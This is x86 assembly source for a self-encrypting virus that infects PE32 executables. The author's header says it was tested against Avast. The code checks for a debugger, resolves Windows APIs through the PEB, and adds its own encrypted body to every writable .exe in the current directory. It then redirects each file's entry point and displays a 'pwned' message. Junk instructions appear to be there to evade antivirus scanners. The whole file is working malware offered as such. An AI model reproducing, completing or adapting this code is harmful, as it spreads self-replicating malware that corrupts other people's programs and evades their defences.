
;[== THE ========================================================]
;[] _____         _______        ___   ___      _______         []
;[] \    \    /\  \      \   /\  \  | |  /  /\  \      \   /\   []
;[]  |  > \  /  \  |   > /  /  \  | |_| |  /  \  |   > /  /  \  []
;[]  | |  / / /\ \ |   > \ / /\ \ |  _  | / /\ \ |   > \ / /\ \ []
;[]  |_|\ \ \__  / |___  / \__  / |_| | | \__  / |___  / \__  / []
;[]      \/    \/      \/     \/       \|    \/      \/     \/  []
;[=================================================== PRESENTS ==]

; ==========================================================================================;
; ------------------------------------------------------------------------------------------;
;     FILENAME : r0b0h0b0.asm                                                               ;
; ------------------------------------------------------------------------------------------;
;       AUTHOR : r0b0h0b0                                                                   ;
;        EMAIL : r0b0h0b0@proton.me                                                         ;
; DATE CREATED : 3/22/2023                                                                  ;
;         TEST : Windows XP (Avast Antivirus)                                               ;                                                                                           ;
;  DESCRIPTION : Overwriting virus for PE32 exe files in current directory.                 ;
;                Based off Stoned and Joshua viruses, and some shellcode injectors.         ;
;                Will not work while being debugged. HAHAHAHAHAHA!                          ;
; ==========================================================================================;

; 109876543210987654321098|76543210
;[################HHHHHHHH|LLLLLLLL]
;[                <--AH-->|<--AL-->]
;[                <------AX------->]
;[<--------------EAX-------------->]

.386
.model flat, stdcall
option casemap:none

    include \masm32\include\windows.inc
    include \masm32\include\wdm.inc
    include \masm32\include\kernel32.inc
    include \masm32\include\user32.inc
    include .\r0b0h0b0.inc
    includelib \masm32\lib\kernel32.lib

.code

start_of_code:
    call decryptor_get_eip
    decryptor_get_eip:
	   pop edx
    sub edx, 5
    push edx ; save it
    push eax
    pop eax
    lea esi, [edx + (data - start_of_code)]
    nop
    push eax
    pop eax
    ; check for debugger
    ASSUME FS:NOTHING
    mov edx, fs:[30h]
    ASSUME FS:ERROR
    cmp (PEB PTR [edx]).BeingDebugged, 0
    push eax
    pop eax
    nop
    jne end_of_code
    nop 
    cypt_key:
    mov edx, 00000000h
    xor ecx, ecx
    decryptor_loop_b:
	   cmp ecx, (end_of_code - data)
	   je decryptor_loop_e
	   mov al, [esi + ecx]
	   xor al, dl
         nop
	   mov [esi + ecx], al
         push eax
         pop eax
	   inc ecx
         nop
	   ror edx, cl
         jmp decryptor_loop_b
    decryptor_loop_e:
    pop eax ; start_of_code address
    mov ebp, esp ; reset ebp
    nop
    lea eax, [eax + (start - start_of_code)]
    jmp eax

data:
    fileQuery               BYTE ".\*.exe",0
    GetModuleFileName_str   BYTE "GetModuleFileNameA",0
    FindFirstFile_str       BYTE "FindFirstFileA",0
    FindNextFile_str        BYTE "FindNextFileA",0
    FindClose_str           BYTE "FindClose",0
    GetFullPathName_str     BYTE "GetFullPathNameA",0
    lstrlen_str             BYTE "lstrlen",0
    CreateFile_str          BYTE "CreateFileA",0
    CreateFileMapping_str   BYTE "CreateFileMappingA",0
    MapViewOfFile_str       BYTE "MapViewOfFile",0
    UnmapViewOfFile_str     BYTE "UnmapViewOfFile",0
    CloseHandle_str         BYTE "CloseHandle",0
    LoadLibrary_str         BYTE "LoadLibraryA",0
    FreeLibrary_str         BYTE "FreeLibrary",0
    MessageBox_str          BYTE "MessageBoxA",0
    User32_str              BYTE "User32",0
    PopUpMessage            BYTE "pwned by da r0b0h0b0. Shhhh!",0
    GetTickCount_str		BYTE "GetTickCount",0
    returnAddr              DWORD 000000000h

; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい

PopUp proc

    LOCAL pMem  :DWORD

  ; --------------------------------------------------------
  ; Return value in EAX is the memory pointer to the result
  ; The data length is returned in ECX. Deallocate memory in
  ; EAX with the Windows API function GlobalFree() or the
  ; MASM32 macro "free".
  ; --------------------------------------------------------

    push ebx
    push esi
    push edi

    mov pMem, 29

    mov esi, pMem

    mov DWORD PTR [esi+0], 3527344145
    mov DWORD PTR [esi+4], 1053247386
    mov DWORD PTR [esi+8], 3139946680
    mov DWORD PTR [esi+12], 2011744531
    mov DWORD PTR [esi+16], 3925728362
    mov DWORD PTR [esi+20], 1185816795
    mov DWORD PTR [esi+24], 1387125627

    mov edi, 28
    or ebx, -1

  @@:
    add ebx, 1
    movzx edx, BYTE PTR [PopUp_pad+ebx]
    xor [esi+ebx], dl
    sub edi, 1
    jnz @B

  ; -------------------------------------------------
  ; EAX is the memory pointer, ECX is the BYTE length
  ; -------------------------------------------------
    mov eax, pMem
    mov ecx, 28

    pop edi
    pop esi
    pop ebx

    ret

  .data
  PopUp_pad \
    db 97,119,81,183,254,103,165,71,152,172,70,155,97,249,138,71
    db 2,236,159,217,245,0,253,46,19,179,197,115
  .code

PopUp endp

; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい

; ret : function address
; arg1: function name
; arg2: STACK_STORAGE struct
GetProcAddr:
    pop eax ; ret
    nop
    pop ecx ; arg1
    nop
    pop edx ; arg2
    nop
    push eax
    push ecx
    push (STACK_STORAGE PTR [edx]).GetProcAddress_module
    nop
    call (STACK_STORAGE PTR [edx]).GetProcAddress_addr
    pop edx
    nop
    jmp edx

; ret : none
; arg1: file size
; arg2: STACK_STORAGE struct
MapFileToRAM:
    ; use of offsets on esp, because the arguments
    ; and return address are on the stack
    push [esp + (sizeof DWORD * 2)]
    nop
    lea eax, [ebx + (CreateFileMapping_str - data)]
    nop
    push eax
    call GetProcAddr
    mov edx, [esp + (sizeof DWORD * 2)]
    nop
    mov edx, (STACK_STORAGE PTR [edx]).fileHandle
    nop
    mov ecx, [esp + (sizeof DWORD * 1)]
    nop
    push NULL
    push ecx
    push 0
    push ebx
    nop
    push esi
    push edi
    pop edi
    pop esi
    pop ebx

    push PAGE_READWRITE
    push NULL
    nop
    push edx
    call eax ; CreateFileMapping()
    mov edx, [esp + (sizeof DWORD * 2)]
    mov (STACK_STORAGE PTR [edx]).fileMappingHandle, eax
    nop
    push [esp + (sizeof DWORD * 2)]
    lea eax, [ebx + (MapViewOfFile_str - data)]
    push eax
    call GetProcAddr
    mov edx, [esp + (sizeof DWORD * 2)]
    mov edx, (STACK_STORAGE PTR [edx]).fileMappingHandle
    nop
    push 0
    push 0
    push 0
    nop
    push (FILE_MAP_WRITE or FILE_MAP_READ)
    push edx
    call eax ; MapViewOfFile()
    mov edx, [esp + (sizeof DWORD * 2)]
    mov (STACK_STORAGE PTR [edx]).fileView, eax
    pop edx
    pop ecx
    pop ecx
    jmp edx

; ret : none
; arg1: STACK_STORAGE struct
UnmapFileFromRAM:
    push [esp + (sizeof DWORD * 1)]
    nop
    nop
    lea eax, [ebx + (UnmapViewOfFile_str - data)]
    push eax
    call GetProcAddr
    mov edx, [esp + (sizeof DWORD * 1)]
    nop
    push (STACK_STORAGE PTR [edx]).fileView
    nop
    nop
    call eax ; UnmapViewOfFile()
    nop
    push [esp + (sizeof DWORD * 1)]
    nop
    lea eax, [ebx + (CloseHandle_str - data)]
    push eax
    call GetProcAddr
    mov edx, [esp + (sizeof DWORD * 1)]
    nop
    nop
    push (STACK_STORAGE PTR [edx]).fileMappingHandle
    call eax ; CloseHandle()
    pop edx
    pop ecx
    jmp edx

; ret : bool
; arg1: string1
; arg2: string2
; arg3: length
lstrncmp:
    xor esi, esi ; string offset
    nop
    xor eax, eax
    
lstrncmp_loop:
    cmp esi, [esp + (sizeof DWORD * 3)]
    nop
    je lstrncmp_end_equal
    nop
    mov ecx, [esp + (sizeof DWORD * 1)]
    nop
    mov cl, [ecx + esi]
    mov edx, [esp + (sizeof DWORD * 2)]
    nop
    mov dl, [edx + esi]
    nop
    cmp cl, dl
    jne lstrncmp_end_not_equal
    inc esi
    nop
    jmp lstrncmp_loop
    
lstrncmp_end_equal:
    mov al, 1
    nop
    jmp lstrncmp_end
    
lstrncmp_end_not_equal:
    mov al, 0
    nop
    
lstrncmp_end:
    pop edx
    nop
    pop ecx
    pop ecx
    nop
    pop ecx
    nop
    jmp edx

start:
    call get_eip ; get the injected exe env instruction pointer
    push ebx
    push esi
    push edi
    pop edi
    pop esi
    pop ebx

get_eip:
    pop ebx
    ; ebx holds "data section" address
    ; (call instruction + (start label address - data label instruction))
    nop
    sub ebx, (5 + (start - data))
    push ebx ; save it back temporarily
    ; resolve kernel32 base address
    ASSUME FS:NOTHING
    mov edx, fs:[30h] ; get the PEB struct
    nop
    ASSUME FS:ERROR
    ; ->Ldr / get the PEB_LDR_DATA struct
    mov edx, (PEB PTR [edx]).Ldr
    ; ->InMemoryOrderModuleList / gets the loaded modules linked list
    lea edx, (PEB_LDR_DATA PTR [edx]).InMemoryOrderModuleList
    nop
    ; loop through the linked list until we match with "KERNEL32.DLL"
    ; partial case insensitive check : length=12; name[0]=K; name[5]=L; name[6]=3; name[7]=2
    ; enough because KERNEL32 should always be before some other DLL matching this pattern

loop_find_kernel32:
    ; ->FullDllName / get the UNICODE_STRING struct
    lea eax, (LDR_DATA_TABLE_ENTRY PTR [edx]).FullDllName
    ; ->Len
    mov bx, (UNICODE_STRING PTR [eax]).Len
    nop
    ; check the length
    cmp bx, (12 * sizeof WCHAR)
    jne loop_find_kernel32_continue
    nop
    ; ->Buffer
    mov eax, (UNICODE_STRING PTR [eax]).Buffer
    ; check the string
    xor edi, edi
    mov bx, [eax]
    mov di, 'K'
    nop
    cmp bx, 'a' ; check case
    jl lfk32_first_letter_cmp
    add di, ('a' - 'A') ; make lowercase

lfk32_first_letter_cmp:
    cmp bx, di
    jne loop_find_kernel32_continue
    nop
    mov bx, [eax + 5 * sizeof WCHAR]
    mov di, 'L'
    nop
    cmp bx, 'a'
    jl lfk32_second_letter_cmp
    add di, ('a' - 'A')

lfk32_second_letter_cmp:
    cmp bx, di
    jne loop_find_kernel32_continue
    mov ebx, [eax + 6 * sizeof WCHAR]
    nop
    cmp ebx, 00320033h ; "32" in little endian wide characters
    nop
    jne loop_find_kernel32_continue
    jmp loop_find_kernel32_end

loop_find_kernel32_continue:
    ; (LIST_ENTRY)->Flink / get next loaded module
    mov edx, (LIST_ENTRY PTR [edx]).Flink
    nop
    jmp loop_find_kernel32

loop_find_kernel32_end:
    ; ->DllBase, for some reason, does not hold the base address
    ; instead ->Reserved2[0] does
    mov ebx, (LDR_DATA_TABLE_ENTRY PTR [edx]).Reserved2[0 * sizeof PVOID]
    nop
    mov edx, ebx
    ; get PE header (base address + offset from the DOS header)
    add edx, [edx + 03Ch]
    nop
    ; get export table
    mov edx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).OptionalHeader) \
	        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof IMAGE_OPTIONAL_HEADER] \
			.VirtualAddress
    add edx, ebx
    push edx ; save export table on the stack
    ; get function names array
    mov edx, [edx + 020h] ; AddressOfNames
    nop
    add edx, ebx
    nop
    xor ecx, ecx ; index = 0
    ; loop trough export function names

loop_find_gpa:
    mov eax, [edx + ecx]
    add eax, ebx
    ; check the string with "GetProcA", should be enough
    ; in reverse because of the endianness
    mov edi, [eax]
    nop
    cmp edi, 'PteG'
    nop
    jne loop_find_gpa_continue
    mov edi, [eax + 4]
    nop
    cmp edi, 'Acor'
    jne loop_find_gpa_continue
    jmp loop_find_gpa_end

loop_find_gpa_continue:
    add ecx, sizeof LPSTR ; index += 1
    nop
    jmp loop_find_gpa

loop_find_gpa_end:
    pop edx ; get the export table back
    nop
    mov eax, edx
    ; now use this index to find the function ordinal (address array index)
    mov edx, [edx + 024h] ; AddressOfNameOrdinals
    add edx, ebx
    shr ecx, 1 ; index /= 2 (32 bit array -> 16 bit array)
    xor edi, edi
    nop
    nop
    nop
    mov di, [edx + ecx]
    shl edi, 2 ; index *= 4 (sizeof PVOID)
    mov edx, eax
    ; now use the ordinal to get the function address
    mov edx, [edx + 01Ch] ; AddressOfFunctions
    add edx, ebx
    nop
    nop
    mov ecx, [edx + edi]
    add ecx, ebx
    nop
    mov edi, ebx ; save kernel32 base address
    ; check STACK_STORAGE DWORD (4 bytes) alignment
    xor edx, edx
    mov ax, sizeof STACK_STORAGE
    mov bx, 4
    div bx
    nop
    add dx, sizeof STACK_STORAGE
    pop ebx
    nop
    ; allocate space on the stack, sp register instead of esp because
    ; the structure size fits in a WORD, saves on instruction size
    sub sp, dx
    ; store GetProcAddress address
    mov (STACK_STORAGE PTR [esp]).GetProcAddress_addr, ecx
    ; store kernel32 base address
    nop
    mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, edi
    ; set it as module for GetProcAddress
    nop
    mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, edi
    ; set actual struct size on stack
    nop
    mov (STACK_STORAGE PTR [esp]).alignedSize, dx
    push esp
    lea eax, [ebx + (FindFirstFile_str - data)]
    push eax
    call GetProcAddr
    mov (STACK_STORAGE PTR [esp]).fileQueryHandle, INVALID_HANDLE_VALUE
    nop
    lea edx, (STACK_STORAGE PTR [esp]).fileStruct
    push edx
    lea edx, [ebx + (fileQuery - data)]
    push edx
    call eax ; FindFirstFile()
    cmp eax, INVALID_HANDLE_VALUE
    nop
    je loop_find_file_end
    mov (STACK_STORAGE PTR [esp]).fileQueryHandle, eax
    nop

loop_find_file:
    push esp
    lea eax, [ebx + (GetFullPathName_str - data)]
    push eax
    call GetProcAddr
    ; check file and put it on the stack if needed
    lea edx, (STACK_STORAGE PTR [esp]).fileName
    lea ecx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).cFileName
    push NULL
    push edx
    push MAX_PATH
    push ecx
        nop
    nop
    nop
    call eax ; GetFullPathName() / get absolute file path
    ; check if it actually ends with .exe
    push esp
    lea eax, [ebx + (lstrlen_str - data)]
    push eax
    call GetProcAddr
    lea edx, (STACK_STORAGE PTR [esp]).fileName
    push edx
    call eax
    ; get to the end of the name, expecting ".exe"
    lea edx, (STACK_STORAGE PTR [esp]).fileName[eax - 4]
    mov edx, [edx]
    cmp edx, 'exe.' ; (little endian)
    jne loop_find_file_continue
    ; check if it's a directory
    mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
    and edx, FILE_ATTRIBUTE_DIRECTORY
        nop
    nop
    nop
    cmp edx, FILE_ATTRIBUTE_DIRECTORY
    je loop_find_file_continue
    ; check if it's a read-only file
    mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
    and edx, FILE_ATTRIBUTE_READONLY
    cmp edx, FILE_ATTRIBUTE_READONLY
        nop
    nop
    nop
    je loop_find_file_continue
    ; Target appears good
    push esp
    lea eax, [ebx + (CreateFile_str - data)]
    push eax
    call GetProcAddr
    lea edx, (STACK_STORAGE PTR [esp]).fileName
    push NULL
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push NULL
    push (FILE_SHARE_READ or FILE_SHARE_WRITE)
    push (GENERIC_READ or GENERIC_WRITE)
    push edx
        nop
    nop
    nop
    call eax ; CreateFile()
    cmp eax, INVALID_HANDLE_VALUE
    je loop_find_file_continue ; if handle != null
    mov (STACK_STORAGE PTR [esp]).fileHandle, eax
    push esp
    push 0
    call MapFileToRAM
    ; get PE header (base address + offset from the DOS header)
    mov edi, (STACK_STORAGE PTR [esp]).fileView
    add edi, [edi + 03Ch]
    ; check if executable
    mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).Characteristics
    and ax, IMAGE_FILE_EXECUTABLE_IMAGE
    cmp ax, IMAGE_FILE_EXECUTABLE_IMAGE
    jne close_target
        nop
    nop
    nop
    ; check if 32 bit
    mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).Machine
    cmp ax, IMAGE_FILE_MACHINE_I386
    jne close_target
    ; get sections count
    xor ecx, ecx
    mov cx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).NumberOfSections
    dec ecx
    ; get last section header
    mov eax, sizeof IMAGE_SECTION_HEADER
    mul ecx ; eax = (sizeof IMAGE_SECTION_HEADER * NumberOfSections)
    lea edx, (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader
        nop
    nop
    nop
    add dx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).SizeOfOptionalHeader
    mov ecx, edx ; save first section header
    add edx, eax
    mov (STACK_STORAGE PTR [esp]).filePeHeader, edi
    mov (STACK_STORAGE PTR [esp]).fileLastSectionHeader, edx
    ; check if itself
    mov eax, ebx
    add eax, (start - data)
    ; get physical entry point address
    sub ecx, sizeof IMAGE_SECTION_HEADER

find_entrypoint_section_loop:
    add ecx, sizeof IMAGE_SECTION_HEADER
    mov edx, (IMAGE_SECTION_HEADER PTR [ecx]).VirtualAddress
    add edx, (IMAGE_SECTION_HEADER PTR [ecx]).Misc
    cmp edx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
    jl find_entrypoint_section_loop
    mov edx, (IMAGE_SECTION_HEADER PTR [ecx]).VirtualAddress
    sub edx, (IMAGE_SECTION_HEADER PTR [ecx]).PointerToRawData
    mov ecx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
    add ecx, (STACK_STORAGE PTR [esp]).fileView
    sub ecx, edx
    push end_of_code - start
    push ecx
    push eax
    call lstrncmp
    cmp al, 0
    jne close_target
    mov edi, (STACK_STORAGE PTR [esp]).filePeHeader
    nop
    mov edx, (STACK_STORAGE PTR [esp]).fileLastSectionHeader
    nop
    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Characteristics
    ; set as executable code & writeable
    or eax, (IMAGE_SCN_MEM_EXECUTE OR IMAGE_SCN_CNT_CODE OR IMAGE_SCN_MEM_WRITE)
    ; set as not discardable
    mov ecx, IMAGE_SCN_MEM_DISCARDABLE
    not ecx
    and eax, ecx
    ; update it
    mov (IMAGE_SECTION_HEADER PTR [edx]).Characteristics, eax
    ; update VirtualSize
    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Misc
    add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
    mov (IMAGE_SECTION_HEADER PTR [edx]).Misc, eax
    ; save where to inject in the target
    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
    nop
    add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
    mov (STACK_STORAGE PTR [esp]).offsetToDest, eax
    ; update SizeOfRawData
    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
    add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
    mov (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData, eax
    ; update SizeOfImage
    mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage
    nop
    add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
    nop
    mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage, eax
    ; save original entry point
    mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).ImageBase
    nop
    add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
    mov (STACK_STORAGE PTR [esp]).origEntryPoint, eax
    mov eax, (STACK_STORAGE PTR [esp]).offsetToDest
    ; physical to virtual address
    mov ecx, (IMAGE_SECTION_HEADER PTR [edx]).VirtualAddress
    nop
    sub ecx, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
    add eax, ecx
    ; update it
    mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint, eax
    ; re-map the file to memory and change its size
    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
    add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
    mov (STACK_STORAGE PTR [esp]).fileSize, eax
    push esp
    call UnmapFileFromRAM
    mov eax, (STACK_STORAGE PTR [esp]).fileSize
    push esp
    push eax
    call MapFileToRAM
    ; inject itself
    lea esi, [ebx - (data - start_of_code)]		              ; src
    mov edi, (STACK_STORAGE PTR [esp]).fileView
    nop
    add edi, (STACK_STORAGE PTR [esp]).offsetToDest
    nop                 ; dst
    mov ecx, (end_of_code - start_of_code)                          ; length
    rep movsb
    ; generate encryption key
    push esp
    lea eax, [ebx + (GetTickCount_str - data)]
    push eax
    call GetProcAddr
    call eax ; GetTickCount()
    xor eax, (STACK_STORAGE PTR [esp]).kernel32BaseAddr
    nop
    xor eax, (STACK_STORAGE PTR [esp]).origEntryPoint
    nop
    mov (STACK_STORAGE PTR [esp]).cryptKey, eax
    ; store it in the decryptor
    ; eax : cryptKey
    mov edi, (STACK_STORAGE PTR [esp]).fileView
    add edi, (STACK_STORAGE PTR [esp]).offsetToDest
    add edi, ((cypt_key - start_of_code) + 1)
    mov [edi], eax
    ; set return address to the original entry point
    mov edx, (STACK_STORAGE PTR [esp]).fileView
    nop
    add edx, (STACK_STORAGE PTR [esp]).offsetToDest
    nop
    mov eax, (STACK_STORAGE PTR [esp]).origEntryPoint
    nop
    mov [edx + (returnAddr - start_of_code)], eax
    ; then the body, xor-encrypting it
    mov edi, (STACK_STORAGE PTR [esp]).fileView
    add edi, (STACK_STORAGE PTR [esp]).offsetToDest
    add edi, (data - start_of_code)
    xor ecx, ecx	  							        ; index
    mov edx, (STACK_STORAGE PTR [esp]).cryptKey
    encryptor_loop_b:
    	cmp ecx, (end_of_code - data)
	je encryptor_loop_e
	mov al, [edi + ecx] ; byte to copy
	xor al, dl
	mov [edi + ecx], al
	inc ecx
	ror edx, cl
	jmp encryptor_loop_b
    encryptor_loop_e:

close_target:
    push esp
    call UnmapFileFromRAM
    push esp
    lea eax, [ebx + (CloseHandle_str - data)]
    push eax
    call GetProcAddr
    push (STACK_STORAGE PTR [esp]).fileHandle
    call eax ; CloseHandle()

loop_find_file_continue:
    push esp
    lea eax, [ebx + (FindNextFile_str - data)]
    push eax
    call GetProcAddr
    lea edx, (STACK_STORAGE PTR [esp]).fileStruct
    nop
    mov ecx, (STACK_STORAGE PTR [esp]).fileQueryHandle
    push edx
    push ecx
    call eax
    cmp eax, TRUE
    je loop_find_file

loop_find_file_end:
    push esp
    lea eax, [ebx + (FindClose_str - data)]
    push eax
    call GetProcAddr
    push (STACK_STORAGE PTR [esp]).fileQueryHandle
    nop
    call eax ; FindClose() / close its handle
    mov eax, [ebx + (returnAddr - data)]
    nop
    cmp eax, 0
    je end_of_code
    ; get LoadLibraryA
    push esp
    nop
    lea eax, [ebx + (LoadLibrary_str - data)]
    push eax
    call GetProcAddr
    lea edx, [ebx + (User32_str - data)]
    push edx
    call eax ; LoadLibrary()
    mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, eax ; so GetProcAddress finds MessageBox
    ; get MessageBoxA
    push esp
    lea edx, [ebx + (MessageBox_str - data)]
    push edx
    nop
    call GetProcAddr
    lea edx, [ebx + (PopUpMessage - data)]
    push MB_OK
    push edx
    nop
    push edx
    push NULL
    call eax ; MessageBox()
    ; put User32 handle on the stack
    mov edx, esp
    nop
    push (STACK_STORAGE PTR [esp]).GetProcAddress_module
    nop
    mov eax, (STACK_STORAGE PTR [edx]).kernel32BaseAddr
    nop
    mov (STACK_STORAGE PTR [edx]).GetProcAddress_module, eax
    push edx
    nop
    lea eax, [ebx + (FreeLibrary_str - data)]
    push eax
    call GetProcAddr
    call eax ; FreeLibrary() ; handle argument already on the stack
    add sp, (STACK_STORAGE PTR [esp]).alignedSize ; "free" the stack
    mov eax, [ebx + (returnAddr - data)]
    jmp eax

end_of_code:
    push ebx
    push esi
    push edi
    pop edi
    pop esi
    pop ebx
    add sp, (STACK_STORAGE PTR [esp]).alignedSize ; "free" the stack
    ; hard-coded call, so kernel32 is loaded in the infector
    push 0
    nop
    nop
    nop
    call ExitProcess

end start